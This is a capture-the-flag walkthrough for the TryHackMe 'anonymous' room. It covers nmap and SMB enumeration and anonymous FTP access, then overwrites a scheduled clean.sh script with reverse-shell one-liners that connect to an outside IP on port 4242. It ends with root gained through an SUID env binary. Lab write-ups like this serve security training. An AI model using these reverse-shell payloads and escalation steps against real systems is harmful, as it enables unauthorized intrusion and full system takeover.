# Writeup for THM room [anonymous](https://tryhackme.com/room/anonymous)

```fish
set -gx IP 10.10.184.173
```

## Start Enumeration with nmap

```fish
nmap -sN -sC -sV -oN nmap/init $IP
```

> Found 2 ports open: `21 & 22` (ftp, ssh)

Doing a full port scan:

```fish
nmap -sN -sC -sV -p- -oN nmap/all_ports $IP
```

> Found 4 ports open: `21, 22, 133, 445` (ftp, ssh, samba, samba)

## Try using smbmap

```fish
smbmap -H //$IP/
```

> Found an open share: `pics`

Connect to those:

```fish
smbclient --url //$IP/pics
```

## Try using ftp anonymous login

```fish
ftp -a $IP
```

> Login successfull, found multiple files which indicates that `clean.sh` got called multiple times.

Download file and put reverese-shell code inside:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.18.94.63/4242 0>&1
0<&196;exec 196<>/dev/tcp/10.18.94.63/4242; sh <&196 >&196 2>&196
/bin/bash -l > /dev/tcp/10.18.94.63/4242 0<&1 2>&1
```

Upload file:

```ftp
put clean.sh
```

Open netcat listener:

```fish
nc -lvnp 4242
```

> Got remote shell with user `namelessone`, found user.txt

```bash
cat user.txt
```

## Priviledge escalation

Find SUID enabled commands

```fish
find / -perm /4000 2>/dev/null
```

> Found `/usr/bin/env`: use [here](https://gtfobins.github.io/gtfobins/env/)

```bash
env /bin/sh -p
```

> Got root and print out root.txt

```bash
cat /root/root.txt
```
